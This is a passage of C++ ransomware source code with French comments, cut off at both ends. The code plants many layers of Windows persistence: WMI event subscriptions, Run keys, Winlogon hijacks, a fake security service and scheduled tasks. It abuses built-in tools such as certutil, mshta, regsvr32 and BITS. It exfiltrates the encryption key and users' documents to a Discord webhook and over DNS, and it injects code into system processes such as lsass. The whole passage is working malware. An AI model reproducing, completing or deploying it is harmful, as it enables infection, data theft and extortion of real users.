        wmiRestoreScript << "    Set-WmiInstance -Class __FilterToConsumerBinding -Namespace 'root\\subscription' -Arguments @{" << std::endl;
        wmiRestoreScript << "        Filter = $WinlogonFilter;" << std::endl;
        wmiRestoreScript << "        Consumer = (Get-WmiObject -Namespace 'root\\subscription' -Class CommandLineEventConsumer -Filter \"Name='WindowsSecurityConsumer'\");" << std::endl;
        wmiRestoreScript << "        DeliveryQoS = 1" << std::endl;
        wmiRestoreScript << "    }" << std::endl;
        wmiRestoreScript << "}" << std::endl;
        wmiRestoreScript << "if (-not (Get-WmiObject -Namespace 'root\\subscription' -Class __EventFilter -Filter \"Name='SmssBootFilter'\")) {" << std::endl;
        wmiRestoreScript << "    $SmssFilter = Set-WmiInstance -Class __EventFilter -Namespace 'root\\subscription' -Arguments @{" << std::endl;
        wmiRestoreScript << "        Name='SmssBootFilter';" << std::endl;
        wmiRestoreScript << "        EventNameSpace='root\\cimv2';" << std::endl;
        wmiRestoreScript << "        QueryLanguage='WQL';" << std::endl;
        wmiRestoreScript << "        Query='SELECT * FROM Win32_ProcessStartTrace WHERE ProcessName = \"smss.exe\"'" << std::endl;
        wmiRestoreScript << "    }" << std::endl;
        wmiRestoreScript << "    Set-WmiInstance -Class __FilterToConsumerBinding -Namespace 'root\\subscription' -Arguments @{" << std::endl;
        wmiRestoreScript << "        Filter = $SmssFilter;" << std::endl;
        wmiRestoreScript << "        Consumer = (Get-WmiObject -Namespace 'root\\subscription' -Class CommandLineEventConsumer -Filter \"Name='WindowsSecurityConsumer'\");" << std::endl;
        wmiRestoreScript << "        DeliveryQoS = 1" << std::endl;
        wmiRestoreScript << "    }" << std::endl;
        wmiRestoreScript << "}" << std::endl;
        wmiRestoreScript << "# Exécuter le programme si nécessaire" << std::endl;
        wmiRestoreScript << "Start-Process -FilePath $LibraryPath -WindowStyle Hidden" << std::endl;
        wmiRestoreScript.close();
        
        // 10. Créer un WMI event consumer qui exécute ce script de restauration quotidiennement
        std::string createRestoreFilterCmd = "powershell -Command \"$RestoreFilter = Set-WmiInstance -Class __EventFilter -Namespace 'root\\subscription' -Arguments @{Name='SecurityManagerFilter'; EventNameSpace='root\\cimv2'; QueryLanguage='WQL'; Query='SELECT * FROM __InstanceModificationEvent WITHIN 86400 WHERE TargetInstance ISA ''Win32_LocalTime'' AND TargetInstance.Hour = 3 AND TargetInstance.Minute = 0'}\"";
        
        std::string createRestoreConsumerCmd = "powershell -Command \"$RestoreConsumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace 'root\\subscription' -Arguments @{Name='SecurityManagerConsumer'; CommandLineTemplate='powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File " + wmiRestorePath + "'; RunInteractively='false'}\"";
        
        std::string createRestoreBindingCmd = "powershell -Command \"Set-WmiInstance -Class __FilterToConsumerBinding -Namespace 'root\\subscription' -Arguments @{Filter=(Get-WmiObject -Namespace 'root\\subscription' -Class __EventFilter -Filter \\\"Name='SecurityManagerFilter'\\\"); Consumer=(Get-WmiObject -Namespace 'root\\subscription' -Class CommandLineEventConsumer -Filter \\\"Name='SecurityManagerConsumer'\\\"); DeliveryQoS=1}\"";
        
        // 11. Exécuter toutes les commandes PowerShell
        system(("powershell -Command \"Start-Process powershell -ArgumentList '-ExecutionPolicy Bypass -Command \"" + createClassCmd + "\"' -Verb RunAs -WindowStyle Hidden\"").c_str());
        Sleep(1000); // Attendre que le namespace soit créé
        
        system(createFilterCmd.c_str());
        system(createConsumerCmd.c_str());
        system(createBindingCmd.c_str());
        system(createBootFilterCmd.c_str());
        system(createBootBindingCmd.c_str());
        system(createWinlogonFilterCmd.c_str());
        system(createWinlogonBindingCmd.c_str());
        system(createSmssFilterCmd.c_str());
        system(createSmssBindingCmd.c_str());
        system(storeDataCmd.c_str());
        system(createRestoreFilterCmd.c_str());
        system(createRestoreConsumerCmd.c_str());
        system(createRestoreBindingCmd.c_str());
        
        // 12. Cacher le script de restauration
        system(("attrib +h +s \"" + wmiRestorePath + "\"").c_str());
        
        // 13. Ajouter des méthodes de persistance supplémentaires
        // Registry Run
        system(("REG ADD HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v WindowsSecureService /t REG_SZ /d \"" + exePath + "\" /f").c_str());
        
        // Registry Run pour l'utilisateur actuel
        system(("REG ADD HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v WindowsSecureService /t REG_SZ /d \"" + exePath + "\" /f").c_str());
        
        // Registry RunOnce (priorité au démarrage)
        system(("REG ADD HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce /v WindowsSecureUpdate /t REG_SZ /d \"" + exePath + "\" /f").c_str());
        
        // Modifier Winlogon Shell
        system(("REG ADD \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v Shell /t REG_SZ /d \"explorer.exe," + exePath + "\" /f").c_str());
        
        // Injecter dans Userinit
        std::string currentUserinit = "";
        HKEY hKey;
        if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
            char buffer[1024];
            DWORD bufferSize = sizeof(buffer);
            if (RegQueryValueEx(hKey, "Userinit", 0, NULL, (LPBYTE)buffer, &bufferSize) == ERROR_SUCCESS) {
                currentUserinit = buffer;
            }
            RegCloseKey(hKey);
        }
        
        if (!currentUserinit.empty()) {
            if (currentUserinit.back() != ',') {
                currentUserinit += ',';
            }
            currentUserinit += exePath;
            system(("REG ADD \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v Userinit /t REG_SZ /d \"" + currentUserinit + "\" /f").c_str());
        }
        
        // Créer un service
        std::string serviceCmd = "sc create \"WindowsSecurityService\" binPath= \"" + exePath + "\" start= auto type= own error= ignore";
        system(serviceCmd.c_str());
        system("sc description \"WindowsSecurityService\" \"Microsoft Windows Security Service\"");
        system("sc failure \"WindowsSecurityService\" reset= 0 actions= restart/0");
        system("sc start \"WindowsSecurityService\"");
        
        // Tâches planifiées
        std::string taskCmd = "schtasks /create /tn \"WindowsSecurityInitializer\" /tr \"" + exePath + "\" /sc onstart /ru SYSTEM /f";
        system(taskCmd.c_str());
        std::string loginTaskCmd = "schtasks /create /tn \"WindowsUserInitializer\" /tr \"" + exePath + "\" /sc onlogon /f";
        system(loginTaskCmd.c_str());
        
        std::cout << "[+] Persistance WMI configurée avec succès" << std::endl;
        return true;
    }
    
    std::cout << "[!] Échec de la création du script de restauration WMI" << std::endl;
    return false;
}

// Vérifier et réparer la persistance WMI
bool VerifyAndRepairWMIPersistence() {
    std::cout << "[*] Vérification de la persistance WMI..." << std::endl;
    
    // Vérifier si les filtres WMI et les consommateurs existent
    std::string checkFilter = "powershell -Command \"$filter = Get-WmiObject -Namespace 'root\\subscription' -Class __EventFilter -Filter \\\"Name='WindowsSecurityFilter'\\\"; if ($filter) { Write-Output 'FilterExists' } else { Write-Output 'FilterMissing' }\"";
    
    FILE* filterPipe = _popen(checkFilter.c_str(), "r");
    if (!filterPipe) {
        std::cout << "[!] Impossible de vérifier le filtre WMI" << std::endl;
        return false;
    }
    
    char buffer[128];
    std::string filterStatus = "";
    while (fgets(buffer, sizeof(buffer), filterPipe) != NULL) {
        filterStatus += buffer;
    }
    _pclose(filterPipe);
    
    bool filterExists = (filterStatus.find("FilterExists") != std::string::npos);
    
    std::string checkConsumer = "powershell -Command \"$consumer = Get-WmiObject -Namespace 'root\\subscription' -Class CommandLineEventConsumer -Filter \\\"Name='WindowsSecurityConsumer'\\\"; if ($consumer) { Write-Output 'ConsumerExists' } else { Write-Output 'ConsumerMissing' }\"";
    
    FILE* consumerPipe = _popen(checkConsumer.c_str(), "r");
    if (!consumerPipe) {
        std::cout << "[!] Impossible de vérifier le consommateur WMI" << std::endl;
        return false;
    }
    
    std::string consumerStatus = "";
    while (fgets(buffer, sizeof(buffer), consumerPipe) != NULL) {
        consumerStatus += buffer;
    }
    _pclose(consumerPipe);
    
    bool consumerExists = (consumerStatus.find("ConsumerExists") != std::string::npos);
    
    if (!filterExists || !consumerExists) {
        std::cout << "[!] Persistance WMI compromise, tentative de réparation..." << std::endl;
        
        // Le plus simple est d'exécuter le script de réparation
        std::string tempDir = std::string(getenv("TEMP"));
        std::string wmiRestorePath = tempDir + "\\SecurityServices.ps1";
        
        // Vérifier si le script existe
        if (fs::exists(wmiRestorePath)) {
            std::string repairCmd = "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File \"" + wmiRestorePath + "\"";
            system(repairCmd.c_str());
            std::cout << "[+] Réparation de la persistance WMI effectuée" << std::endl;
            return true;
        } else {
            std::cout << "[!] Script de réparation WMI manquant, reconfiguration complète..." << std::endl;
            return SetupWMIPersistence();
        }
    }
    
    std::cout << "[+] La persistance WMI est intacte" << std::endl;
    return true;
}

// ===========================================================================================
// TECHNIQUES LIVING-OFF-THE-LAND (LoL)
// ===========================================================================================

// Configuration des techniques Living-off-the-land
bool SetupLolPersistence() {
    std::cout << "[*] Configuration des techniques Living-off-the-land..." << std::endl;
    
    // Obtenir le chemin de l'exécutable
    std::string exePath = GetExecutablePath();
    if (exePath.empty()) {
        std::cout << "[!] Impossible d'obtenir le chemin de l'exécutable" << std::endl;
        return false;
    }
    
    // Répertoire temporaire
    std::string tempDir = std::string(getenv("TEMP"));
    
    // 1. Utilisation de WMI pour l'exécution fileless
    std::cout << "[*] Configuration de l'exécution fileless via WMI..." << std::endl;
    
    // Encoder la commande PowerShell
    std::string encodedCommand = base64Encode(std::vector<unsigned char>(exePath.begin(), exePath.end()));
    
    // Stocker le code dans le registre WMI
    std::string mofCommand = "powershell -Command \"$code = [Convert]::FromBase64String('" + encodedCommand + 
                            "'); $mof = New-Object System.Management.ManagementClass('root\\default:Win32_PersistentConfiguration'); " +
                            "$mof.Properties.Add('Name', [System.Management.CimType]::String, $false); " +
                            "$mof.Properties.Add('Data', [System.Management.CimType]::String, $false); " +
                            "$mof.Properties['Name'].Value = 'SecurityProvider'; " +
                            "$mof.Properties['Data'].Value = [Convert]::ToBase64String($code); " +
                            "$mof.Put()\"";
    system(mofCommand.c_str());
    
    // 2. Utiliser PowerShell encodé pour l'exécution
    std::cout << "[*] Configuration de l'exécution PowerShell encodée..." << std::endl;
    
    // Créer une commande PowerShell pour lancer notre exécutable
    std::string launchCommand = "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -c Start-Process '" + exePath + "'";
    std::vector<unsigned char> cmdBytes(launchCommand.begin(), launchCommand.end());
    std::string encodedLaunchCommand = base64Encode(cmdBytes);
    
    // Créer une tâche planifiée qui utilise PowerShell encodé
    std::string scheduleCommand = "schtasks /create /tn \"Windows Security Service\" /tr \"powershell -EncodedCommand " + 
                                encodedLaunchCommand + "\" /sc minute /mo 30 /f";
    system(scheduleCommand.c_str());
    
    // 3. Utiliser des LOLBins (Living Off The Land Binaries)
    std::cout << "[*] Configuration de LOLBins..." << std::endl;
    
    // 3.1 WMIC pour l'exécution
    std::string wmicCommand = "wmic process call create \"" + exePath + "\" > nul";
    system(("schtasks /create /tn \"Windows Update Task\" /tr \"" + wmicCommand + "\" /sc daily /st 09:00 /f").c_str());
    
    // 3.2 CertUtil pour décodage et exécution
    std::string certutilPayload = tempDir + "\\security.b64";
    std::ofstream payloadFile(certutilPayload);
    if (payloadFile.is_open()) {
        payloadFile << encodedCommand;
        payloadFile.close();
        
        // Cacher le fichier
        SetFileAttributesA(certutilPayload.c_str(), FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
        
        // Créer une tâche qui utilise CertUtil
        std::string certutilCommand = "certutil -decode \"" + certutilPayload + "\" \"" + tempDir + "\\winupdate.exe\" && \"" + tempDir + "\\winupdate.exe\"";
        system(("schtasks /create /tn \"Windows Certificate Validator\" /tr \"" + certutilCommand + "\" /sc daily /st 14:00 /f").c_str());
    }
    
    // 3.3 MSHTA pour exécuter du JavaScript
    std::string htaContent = tempDir + "\\update.hta";
    std::ofstream htaFile(htaContent);
    if (htaFile.is_open()) {
        htaFile << "<script>\n";
        htaFile << "var shell = new ActiveXObject('WScript.Shell');\n";
        htaFile << "shell.Run('" << exePath << "', 0);\n";
        htaFile << "window.close();\n";
        htaFile << "</script>";
        htaFile.close();
        
        // Cacher le fichier
        SetFileAttributesA(htaContent.c_str(), FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
        
        // Créer une tâche qui utilise MSHTA
        system(("schtasks /create /tn \"Windows Script Host\" /tr \"mshta.exe \\\"" + htaContent + "\\\"\" /sc daily /st 18:00 /f").c_str());
    }
    
    // 4. BITS (Background Intelligent Transfer Service) pour persistance discrète
    std::cout << "[*] Configuration de BITS pour persistance..." << std::endl;
    
    // Copier l'exécutable vers un emplacement temporaire
    std::string bitsTarget = tempDir + "\\winsec.exe";
    CopyFileA(exePath.c_str(), bitsTarget.c_str(), FALSE);
    
    // Créer un job BITS
    std::string bitsCommand = "bitsadmin /create /download SecurityUpdate && ";
    bitsCommand += "bitsadmin /addfile SecurityUpdate \"http://localhost/update\" \"" + bitsTarget + "\" && ";
    bitsCommand += "bitsadmin /SetNotifyCmdLine SecurityUpdate \"" + bitsTarget + "\" \"\" && ";
    bitsCommand += "bitsadmin /SetMinRetryDelay SecurityUpdate 60 && ";
    bitsCommand += "bitsadmin /resume SecurityUpdate";
    
    system(bitsCommand.c_str());
    
    // 5. Rundll32 pour chargement de DLL
    std::cout << "[*] Configuration de Rundll32 pour persistance..." << std::endl;
    
    // Créer une DLL proxy (simulation - pas une vraie DLL dans cet exemple)
    std::string dllPath = tempDir + "\\winsec.dll";
    std::ofstream dllFile(dllPath, std::ios::binary);
    if (dllFile.is_open()) {
        // En-tête PE minimal (ceci n'est qu'une simulation)
        dllFile << "MZ";
        dllFile.close();
        
        // Cacher le fichier
        SetFileAttributesA(dllPath.c_str(), FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
        
        // Créer une entrée de registre pour charger cette DLL
        std::string rundllCmd = "REG ADD \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"Windows Security\" ";
        rundllCmd += "/t REG_SZ /d \"rundll32.exe \\\"" + dllPath + "\\\",SecurityUpdate\" /f";
        system(rundllCmd.c_str());
    }
    
    // 6. Regsvr32 pour exécution de code (technique Squiblydoo)
    std::cout << "[*] Configuration de Regsvr32 (Squiblydoo)..." << std::endl;
    
    // Créer un script SCT (Scriptlet)
    std::string sctPath = tempDir + "\\update.sct";
    std::ofstream sctFile(sctPath);
    if (sctFile.is_open()) {
        sctFile << "<?XML version=\"1.0\"?>\n";
        sctFile << "<scriptlet>\n";
        sctFile << "<registration progid=\"OfficeUpdate\" classid=\"{F0001111-0000-0000-0000-0000FEEDACDC}\">\n";
        sctFile << "<script language=\"JScript\">\n";
        sctFile << "var r = new ActiveXObject(\"WScript.Shell\").Run(\"" << exePath << "\", 0);\n";
        sctFile << "</script>\n";
        sctFile << "</registration>\n";
        sctFile << "</scriptlet>";
        sctFile.close();
        
        // Cacher le fichier
        SetFileAttributesA(sctPath.c_str(), FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
        
        // Créer une tâche qui utilise regsvr32
        std::string regsvr32Cmd = "regsvr32.exe /s /u /i:\"" + sctPath + "\" scrobj.dll";
        system(("schtasks /create /tn \"COM Object Registration\" /tr \"" + regsvr32Cmd + "\" /sc daily /st 12:00 /f").c_str());
    }
    
    std::cout << "[+] Techniques Living-off-the-land configurées avec succès" << std::endl;
    return true;
}

// ===========================================================================================
// FONCTIONS HTTP POUR WEBHOOK ET EXFILTRATION
// ===========================================================================================

// Envoyer une requête HTTP POST
bool SendHttpPost(const std::string& url, const std::string& data) {
    HINTERNET hInternet = InternetOpenA("RansomwareClient/1.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInternet) {
        return false;
    }
    
    URL_COMPONENTS urlComp;
    char hostName[256] = {0};
    char urlPath[1024] = {0};
    
    ZeroMemory(&urlComp, sizeof(urlComp));
    urlComp.dwStructSize = sizeof(urlComp);
    urlComp.lpszHostName = hostName;
    urlComp.dwHostNameLength = sizeof(hostName);
    urlComp.lpszUrlPath = urlPath;
    urlComp.dwUrlPathLength = sizeof(urlPath);
    
    if (!InternetCrackUrlA(url.c_str(), static_cast<DWORD>(url.length()), 0, &urlComp)) {
        InternetCloseHandle(hInternet);
        return false;
    }
    
    HINTERNET hConnect = InternetConnectA(hInternet, hostName, urlComp.nPort, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
    if (!hConnect) {
        InternetCloseHandle(hInternet);
        return false;
    }
    
    HINTERNET hRequest = HttpOpenRequestA(hConnect, "POST", urlPath, NULL, NULL, NULL, INTERNET_FLAG_SECURE, 0);
    if (!hRequest) {
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);
        return false;
    }
    
    // En-têtes pour la requête
    const char* headers = "Content-Type: application/json\r\n";
    
    // Envoyer la requête
    BOOL result = HttpSendRequestA(hRequest, headers, -1, (LPVOID)data.c_str(), static_cast<DWORD>(data.length()));
    
    // Nettoyer les ressources
    InternetCloseHandle(hRequest);
    InternetCloseHandle(hConnect);
    InternetCloseHandle(hInternet);
    
    return result != FALSE;
}

// Envoyer la clé chiffrée au webhook Discord
bool SendEncryptedKeyToWebhook(const AdvancedEncryption& encryption) {
    // Chiffrer la clé AES avec RSA
    std::vector<unsigned char> encryptedKey = encryption.encryptAesKeyWithRsa();
    if (encryptedKey.empty()) {
        std::cerr << "Erreur lors du chiffrement de la clé AES avec RSA" << std::endl;
        return false;
    }
    
    // Encoder la clé chiffrée en base64 pour la transmission
    std::string encodedKey = base64Encode(encryptedKey);
    
    // Obtenir des informations sur la machine infectée
    std::string username = GetCurrentUsername();
    std::string computerName = GetComputerName();
    
    // Créer un message JSON pour Discord
    std::stringstream payload;
    payload << "{";
    payload << "\"embeds\": [{";
    payload << "\"title\": \"🔐 Nouvelle infection\",";
    payload << "\"description\": \"Une nouvelle machine a été infectée par le ransomware.\",";
    payload << "\"color\": 15258703,";
    payload << "\"fields\": [";
    payload << "{\"name\": \"💻 Machine\", \"value\": \"" << computerName << "\", \"inline\": true},";
    payload << "{\"name\": \"👤 Utilisateur\", \"value\": \"" << username << "\", \"inline\": true},";
    payload << "{\"name\": \"🔑 Clé AES (chiffrée avec RSA)\", \"value\": \"```" << encodedKey << "```\"}";
    payload << "]";
    payload << "}]";
    payload << "}";
    
    // Envoyer au webhook Discord
    for (int attempt = 0; attempt < 3; ++attempt) {
        std::cout << "[*] Tentative d'envoi au webhook Discord (" << (attempt+1) << "/3)..." << std::endl;
        if (SendHttpPost(WEBHOOK_URL, payload.str())) {
            std::cout << "[+] Clé envoyée avec succès au webhook!" << std::endl;
            return true;
        }
        // Attendre avant la prochaine tentative
        Sleep(2000);
    }
    
    std::cout << "[!] Échec de l'envoi des données au webhook. Tentative de méthodes alternatives..." << std::endl;
    
    // Méthodes alternatives d'exfiltration
    // 1. Sauvegarder localement pour une tentative ultérieure
    std::string tempDir = std::string(getenv("TEMP"));
    std::string localPath = tempDir + "\\keybackup.dat";
    std::ofstream keyBackup(localPath, std::ios::binary);
    if (keyBackup) {
        keyBackup << encodedKey;
        keyBackup.close();
        
        // Cacher le fichier
        SetFileAttributesA(localPath.c_str(), FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
        
        // Créer une tâche planifiée qui tentera de renvoyer la clé plus tard
        std::string exePath = GetExecutablePath();
        std::string cmd = "schtasks /create /tn \"DataExfiltration\" /tr \"" + exePath + " --exfil " + localPath + "\" /sc minute /mo 30 /f";
        system(cmd.c_str());
    }
    
    // 2. Utiliser DNS comme canal d'exfiltration (très difficile à bloquer)
    std::string dnsExfilCmd = "powershell -Command \"";
    dnsExfilCmd += "$key = '" + encodedKey.substr(0, 200) + "'; "; // Ne prendre que les premiers 200 caractères pour l'exemple
    dnsExfilCmd += "$parts = [System.Text.RegularExpressions.Regex]::Split($key, '.{30}'); ";
    dnsExfilCmd += "foreach ($part in $parts) { nslookup $part.ransomkey.exfiltration.com 8.8.8.8; Start-Sleep -m 500; }\"";
    system(dnsExfilCmd.c_str());
    
    return false;
}

// Exfiltrer des fichiers sensibles
bool ExfiltrateFiles(const std::string& directory, int maxFiles = 10) {
    std::cout << "[*] Exfiltration de données sensibles..." << std::endl;
    
    // Extensions de fichiers sensibles à exfiltrer
    std::vector<std::string> sensitiveExtensions = {
        ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx",
        ".pdf", ".txt", ".csv", ".db", ".zip", ".rar"
    };
    
    std::vector<std::string> filesToExfiltrate;
    
    // Récursion limitée pour trouver des fichiers sensibles
    try {
        for (const auto& entry : fs::recursive_directory_iterator(
            directory, 
            fs::directory_options::skip_permission_denied
        )) {
            if (filesToExfiltrate.size() >= maxFiles) break;
            
            if (fs::is_regular_file(entry.path())) {
                std::string extension = entry.path().extension().string();
                std::transform(extension.begin(), extension.end(), extension.begin(), ::tolower);
                
                if (std::find(sensitiveExtensions.begin(), sensitiveExtensions.end(), extension) != sensitiveExtensions.end()) {
                    // Vérifier la taille du fichier (limiter aux petits fichiers)
                    if (fs::file_size(entry.path()) < 1024 * 1024) { // 1 MB max
                        filesToExfiltrate.push_back(entry.path().string());
                    }
                }
            }
        }
    } catch (const std::exception& e) {
        // Ignorer les erreurs d'accès
    }
    
    if (filesToExfiltrate.empty()) {
        std::cout << "[!] Aucun fichier sensible trouvé pour exfiltration" << std::endl;
        return false;
    }
    
    std::cout << "[+] " << filesToExfiltrate.size() << " fichiers sensibles trouvés" << std::endl;
    
    // Créer un fichier zip temporaire pour l'exfiltration
    std::string tempDir = std::string(getenv("TEMP"));
    std::string zipPath = tempDir + "\\data.zip";
    
    // Créer un script PowerShell pour compresser les fichiers
    std::string psScript = tempDir + "\\compress.ps1";
    std::ofstream scriptFile(psScript);
    if (scriptFile) {
        scriptFile << "Add-Type -Assembly System.IO.Compression.FileSystem;" << std::endl;
        scriptFile << "$zip = [System.IO.Compression.ZipFile]::Open('" << zipPath << "', [System.IO.Compression.ZipArchiveMode]::Create);" << std::endl;
        
        for (const auto& file : filesToExfiltrate) {
            // Échapper les apostrophes pour PowerShell
            std::string escapedPath = file;
            size_t pos = 0;
            while ((pos = escapedPath.find("'", pos)) != std::string::npos) {
                escapedPath.replace(pos, 1, "''");
                pos += 2;
            }
            
            scriptFile << "try { [System.IO.Compression.ZipFileExtensions]::CreateEntryFromFile($zip, '" 
                      << escapedPath << "', '" << fs::path(file).filename().string() << "'); } catch {}" << std::endl;
        }
        
        scriptFile << "$zip.Dispose();" << std::endl;
        scriptFile.close();
        
        // Exécuter le script PowerShell
        std::string cmd = "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File \"" + psScript + "\"";
        system(cmd.c_str());
        
        // Supprimer le script après utilisation
        fs::remove(psScript);
        
        // Vérifier si le zip a été créé
        if (fs::exists(zipPath) && fs::file_size(zipPath) > 0) {
            // Lire le contenu du zip pour l'exfiltration
            std::ifstream zipFile(zipPath, std::ios::binary);
            if (zipFile) {
                // Lire par morceaux pour économiser la mémoire
                const int chunkSize = 512 * 1024; // 512 KB
                std::vector<char> buffer(chunkSize);
                std::string base64Data;
                
                while (zipFile) {
                    zipFile.read(buffer.data(), chunkSize);
                    std::streamsize bytesRead = zipFile.gcount();
                    if (bytesRead <= 0) break;
                    
                    // Convertir en base64 et ajouter au payload
                    std::vector<unsigned char> chunk(buffer.begin(), buffer.begin() + bytesRead);
                    base64Data += base64Encode(chunk);
                    
                    // Si la donnée est suffisamment grande, envoyer par morceaux
                    if (base64Data.length() > 1024 * 1024) { // 1 MB
                        // Créer un payload JSON pour cette partie
                        std::stringstream payloadChunk;
                        payloadChunk << "{";
                        payloadChunk << "\"embeds\": [{";
                        payloadChunk << "\"title\": \"📂 Données exfiltrées (partie)\",";
                        payloadChunk << "\"description\": \"Échantillon de données sensibles\",";
                        payloadChunk << "\"color\": 15258703";
                        payloadChunk << "}],";
                        payloadChunk << "\"files\": [{";
                        payloadChunk << "\"name\": \"data_part.bin\",";
                        payloadChunk << "\"content\": \"" << base64Data.substr(0, 1024 * 1024) << "\"";
                        payloadChunk << "}]";
                        payloadChunk << "}";
                        
                        // Envoyer ce morceau
                        SendHttpPost(WEBHOOK_URL, payloadChunk.str());
                        
                        // Réinitialiser pour le prochain morceau
                        base64Data = base64Data.substr(1024 * 1024);
                    }
                }
                
                // Envoyer les données restantes
                if (!base64Data.empty()) {
                    // Créer un payload JSON final
                    std::stringstream payloadFinal;
                    payloadFinal << "{";
                    payloadFinal << "\"embeds\": [{";
                    payloadFinal << "\"title\": \"📂 Données exfiltrées (final)\",";
                    payloadFinal << "\"description\": \"Échantillon de données sensibles\",";
                    payloadFinal << "\"color\": 15258703";
                    payloadFinal << "}],";
                    payloadFinal << "\"files\": [{";
                    payloadFinal << "\"name\": \"data_final.bin\",";
                    payloadFinal << "\"content\": \"" << base64Data << "\"";
                    payloadFinal << "}]";
                    payloadFinal << "}";
                    
                    SendHttpPost(WEBHOOK_URL, payloadFinal.str());
                }
                
                zipFile.close();
            }
            
            // Supprimer le zip temporaire
            fs::remove(zipPath);
            
            std::cout << "[+] Exfiltration de données terminée avec succès" << std::endl;
            return true;
        }
    }
    
    std::cout << "[!] Échec de l'exfiltration des données" << std::endl;
    return false;
}

// ===========================================================================================
// FONCTIONS D'INJECTION DE PROCESSUS
// ===========================================================================================

// Injecter le code dans un processus système existant
bool InjectIntoSystemProcess(const std::string& targetProcess = "explorer.exe") {
    std::cout << "[*] Tentative d'injection dans le processus " << targetProcess << "..." << std::endl;
    
    // Obtenir le chemin de l'exécutable actuel
    char selfPath[MAX_PATH];
    GetModuleFileNameA(NULL, selfPath, MAX_PATH);
    
    // Trouver le PID du processus cible
    DWORD targetPID = 0;
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        std::cout << "[!] Impossible de créer un snapshot des processus" << std::endl;
        return false;
    }
    
    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);
    
    if (Process32First(hSnapshot, &pe32)) {
        do {
            if (_stricmp(pe32.szExeFile, targetProcess.c_str()) == 0) {
                targetPID = pe32.th32ProcessID;
                break;
            }
        } while (Process32Next(hSnapshot, &pe32));
    }
    
    CloseHandle(hSnapshot);
    
    if (targetPID == 0) {
        std::cout << "[!] Processus " << targetProcess << " non trouvé. Tentative avec un autre processus..." << std::endl;
        
        // Essayer avec un autre processus système critique
        if (targetProcess != "svchost.exe") {
            return InjectIntoSystemProcess("svchost.exe");
        } else if (targetProcess != "lsass.exe") {
            return InjectIntoSystemProcess("lsass.exe");
        } else {
            std::cout << "[!] Aucun processus système viable trouvé pour l'injection" << std::endl;
            return false;
        }
    }
    
    std::cout << "[+] Processus " << targetProcess << " trouvé avec PID " << targetPID << std::endl;
    
    // Ouvrir le processus cible
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetPID);
    if (hProcess == NULL) {
        std::cout << "[!] Impossible d'ouvrir le processus cible. Erreur: " << GetLastError() << std::endl;
        return false;
    }
    
    // Allouer de la mémoire dans le processus cible
    LPVOID pRemoteBuffer = VirtualAllocEx(hProcess, NULL, MAX_PATH, MEM_COMMIT, PAGE_READWRITE);
    if (pRemoteBuffer == NULL) {
        std::cout << "[!] Impossible d'allouer de la mémoire dans le processus cible. Erreur: " << GetLastError() << std::endl;
        CloseHandle(hProcess);
        return false;
    }
    
    // Écrire le chemin de notre exécutable dans l'espace mémoire alloué
    if (!WriteProcessMemory(hProcess, pRemoteBuffer, selfPath, strlen(selfPath) + 1, NULL)) {
        std::cout << "[!] Impossible d'écrire dans la mémoire du processus cible. Erreur: " << GetLastError() << std::endl;
        VirtualFreeEx(hProcess, pRemoteBuffer, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return false;
    }
    
    // Obtenir l'adresse de LoadLibraryA
    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
    LPVOID pLoadLibrary = (LPVOID)GetProcAddress(hKernel32, "LoadLibraryA");
    
    if (pLoadLibrary == NULL) {
        std::cout << "[!] Impossible de trouver l'adresse de LoadLibraryA. Erreur: " << GetLastError() << std::endl;
        VirtualFreeEx(hProcess, pRemoteBuffer, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return false;
    }
    
    // Créer un thread distant pour exécuter LoadLibraryA avec notre chemin
    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pLoadLibrary, pRemoteBuffer, 0, NULL);
    if (hThread == NULL) {
        std::cout << "[!] Impossible de créer un thread distant. Erreur: " << GetLastError() << std::endl;
        std::cout << "[*] Tentative d'utilisation d'une méthode d'injection alternative..." << std::endl;
        
        // Méthode alternative: Process Hollowing
        STARTUPINFOA si;
        PROCESS_INFORMATION pi;
        ZeroMemory(&si, sizeof(si));
        ZeroMemory(&pi, sizeof(pi));
        si.cb = sizeof(si);
        
        // Créer un processus suspendu
        if (!CreateProcessA(NULL, (LPSTR)targetProcess.c_str(), NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
            std::cout << "[!] Impossible de créer un processus suspendu. Erreur: " << GetLastError() << std::endl;
            VirtualFreeEx(hProcess, pRemoteBuffer, 0, MEM_RELEASE);
            CloseHandle(hProcess);
            return false;
        }
        
        std::cout << "[+] Processus créé en mode suspendu" << std::endl;
        
